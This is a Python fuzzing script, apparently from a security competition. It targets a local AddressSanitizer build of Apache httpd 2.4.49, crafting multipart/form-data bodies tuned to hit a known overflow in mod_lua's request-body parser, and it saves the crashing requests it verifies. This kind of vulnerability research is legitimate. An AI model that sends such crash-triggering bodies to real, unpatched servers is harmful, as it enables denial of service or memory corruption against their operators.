#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""整夜定向 fuzz v4：逐发检测 + 命中后单发回放验证（只保存真实可复现样本）
   触发条件（2.4.49 lua_request.c）: vlen = end - crlf - 8, end=下一个 boundary token
   => distance = 4 + pad <= 7  (pad 0..3)
"""
import os, random, socket, subprocess, time, json, datetime

PREFIX = "/opt/httpd-asan"
CONF = PREFIX + "/conf/httpd-44790.conf"
OUT = "/mnt/e/强网拟态/Apache项目/漏洞挖掘/fuzz"
ERRLOG = PREFIX + "/logs/error_log"
os.makedirs(OUT, exist_ok=True)
DEADLINE = time.time() + int(os.environ.get("FUZZ_SEC", "28800"))
HOST = ("127.0.0.1", 8082)

def sh(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True)

def start():
    sh("pkill -9 -f httpd-asan"); time.sleep(0.3)
    subprocess.Popen([PREFIX + "/bin/httpd", "-f", CONF, "-DFOREGROUND"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    for _ in range(100):
        try:
            s = socket.create_connection(HOST, 0.2); s.close(); return True
        except OSError:
            time.sleep(0.1)
    return False

def make():
    b = random.choice([b"BOUNDARY", b"----WebKitFormBoundary", b"XyZ" + ("%04x" % random.getrandbits(16)).encode()])
    pad = random.choice([0, 0, 1, 1, 2, 2, 3, 3, 4, 6, 10])   # 重点 0..3
    hdr = random.choice([
        b'Content-Disposition: form-data; name="x"; filename="y"\r\n',
        b'Content-Disposition: form-data; name="f"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n',
        b'Content-Disposition: form-data; name="x"\r\n',
    ])
    body = b"--" + b + b"\r\n" + hdr + b"\r\n" + (b"A" * pad) + b + b"--\r\n"
    return b, body

def send(body):
    j = body.find(b"\r\n"); bnd = body[2:j]
    req = (b"POST /parsebody HTTP/1.1\r\nHost: 127.0.0.1\r\n"
           b"Content-Type: multipart/form-data; boundary=" + bnd + b"\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
    try:
        s = socket.create_connection(HOST, 2); s.settimeout(2)
        s.sendall(req)
        while True:
            c = s.recv(4096)
            if not c: break
        s.close()
    except Exception:
        pass

def has_crash():
    try:
        if os.path.getsize(ERRLOG) <= 0: return False
        t = open(ERRLOG, "rb").read()[-200000:]
        return (b"AddressSanitizer" in t) or (b"exit signal" in t)
    except Exception:
        return False

def main():
    start()
    log = open(os.path.join(OUT, "fuzz.log"), "a", buffering=1)
    log.write("[%s] v4 start deadline+%ds\n" % (datetime.datetime.now().isoformat(timespec="seconds"), DEADLINE - time.time()))
    n = verified = false_pos = 0; t0 = time.time()
    while time.time() < DEADLINE:
        b, body = make()
        sh(": > %s" % ERRLOG)
        send(body)
        n += 1
        if has_crash():
            start()
            sh(": > %s" % ERRLOG)
            send(body)
            if has_crash():
                verified += 1
                d = os.path.join(OUT, "verified-%d" % int(time.time()*1000))
                os.makedirs(d, exist_ok=True)
                open(os.path.join(d, "request.bin"), "wb").write(body)
                open(os.path.join(d, "meta.txt"), "w").write("pad_shape=%d boundary=%r\n" % (len(body), b))
                log.write("[%s] VERIFIED #%d req#%d\n" % (datetime.datetime.now().isoformat(timespec="seconds"), verified, n))
            else:
                false_pos += 1
            start()
        if n % 500 == 0:
            log.write("[%s] n=%d verified=%d fp=%d\n" % (datetime.datetime.now().isoformat(timespec="seconds"), n, verified, false_pos))
    log.write("[%s] done n=%d verified=%d fp=%d elapsed=%.0fs\n" % (datetime.datetime.now().isoformat(timespec="seconds"), n, verified, false_pos, time.time()-t0))
    json.dump({"requests": n, "verified": verified, "false_positive": false_pos, "elapsed": time.time()-t0},
              open(os.path.join(OUT, "summary.json"), "w"))

main()
